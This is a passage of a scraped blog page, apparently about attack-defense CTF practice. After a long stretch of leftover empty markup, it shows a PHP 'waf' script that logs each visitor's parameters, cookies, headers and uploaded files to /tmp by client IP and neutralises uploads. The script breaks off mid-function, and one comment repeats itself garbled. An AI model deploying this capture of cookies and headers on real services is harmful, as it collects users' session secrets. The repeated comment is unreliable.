pan></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><h5 id="监控"><a class="anchor" href="#监控">#</a> 监控</h5><p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token function">define</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'LOG_FILEDIR'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'/tmp/loooooooogs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 日志文件目录</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token constant">LOG_FILEDIR</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">// 如果目录不存在则创建</span>
	<span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token constant">LOG_FILEDIR</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 创建目录</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">function</span> <span class="token function-definition function">waf</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 
<span class="token punctuation">&#123;</span> 
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">function_exists</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'getallheaders'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> 
<span class="token keyword">function</span> <span class="token function-definition function">getallheaders</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 获取所有的头信息</span>
<span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$_SERVER</span> <span class="token keyword">as</span> <span class="token variable">$name</span> <span class="token operator">=></span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 循环获取所有的头信息</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'HTTP_'</span><span class="token punctuation">)</span> 
<span class="token variable">$headers</span><span class="token punctuation">[</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">' '</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'-'</span><span class="token punctuation">,</span> <span class="token function">ucwords</span><span class="token punctuation">(</span><span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'_'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">' '</span><span class="token punctuation">,</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$value</span><span class="token punctuation">;</span><span class="token comment">// 将头信息的名称替换为小写，并将下划线替换为空格，并将头信息的名称替换为小写，并将下划线替换为空格，并将头信息的名称替换为小写，并将下划线替换为空格，并将头信息的名称替换为小写，并将下划线替换为空格，并将头信息的名称替换为小写，并将下划线替换为空格，并将头信息的名称替换为小写，并将下划线替换为空格，并将头信息的名称替换为小写，并将下划线替换为空格，并将头信息的名称替换为小写，并将下划线替换为空格，并将头信息的名称替换为小写，并将下划线替</span>
<span class="token punctuation">&#125;</span> 
<span class="token keyword">return</span> <span class="token variable">$headers</span><span class="token punctuation">;</span> 
<span class="token punctuation">&#125;</span> 
<span class="token punctuation">&#125;</span> 
<span class="token variable">$get</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">;</span><span class="token comment">// 获取 get 参数 </span>
<span class="token variable">$post</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">;</span> <span class="token comment">// 获取 post 参数</span>
<span class="token variable">$cookie</span> <span class="token operator">=</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">;</span> <span class="token comment">// 获取 cookie 参数</span>
<span class="token variable">$header</span> <span class="token operator">=</span> <span class="token function">getallheaders</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 获取所有的头信息</span>
<span class="token variable">$files</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">;</span> <span class="token comment">// 获取所有的上传文件信息</span>
<span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"REMOTE_ADDR"</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// 获取客户端 ip</span>
<span class="token variable">$method</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REQUEST_METHOD'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// 获取请求方式</span>
<span class="token variable">$filepath</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"SCRIPT_NAME"</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// 获取文件路径</span>
<span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=></span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 循环获取所有的上传文件信息</span>
<span class="token variable">$files</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 获取文件内容</span>
<span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"virink"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 写入文件</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token variable">$header</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'Accept'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 删除头信息中的 Accept</span>
<span class="token variable">$input</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Get"</span><span class="token operator">=></span><span class="token variable">$get</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"Post"</span><span class="token operator">=></span><span class="token variable">$post</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"Cookie"</span><span class="token operator">=></span><span class="token variable">$cookie</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"File"</span><span class="token operator">=></span><span class="token variable">$files</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"Header"</span><span class="token operator">=></span><span class="token variable">$header</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 将所有的参数合并成一个数组</span>

<span class="token function">logging</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 调用日志函数</span>

<span class="token punctuation">&#125;</span>

<span class="token keyword">function</span> <span class="token function-definition function">logging</span><span class="token punctuation">(</span><span class="token variable">$var</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token comment">// 日志函数</span>
<span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">// 获取客户端 ip</span>
<span class="token variable">$LOG_FILENAME</span> <span class="token operator">=</span> <span class="token constant">LOG_FILEDIR</span><span class="token operator">.</span><span class="token string double-quoted-string">"/"</span><span class="token operator">.</span><span class="token variable">$filename</span><span class="token punctuation">;</span><span class="token comment">// 日志文件路径</span>
<span class="token variable">$time</span> <span class="token operator">=</span> <span class="token function">date</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Y-m-d G:i:s"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 获取当前时间</span>
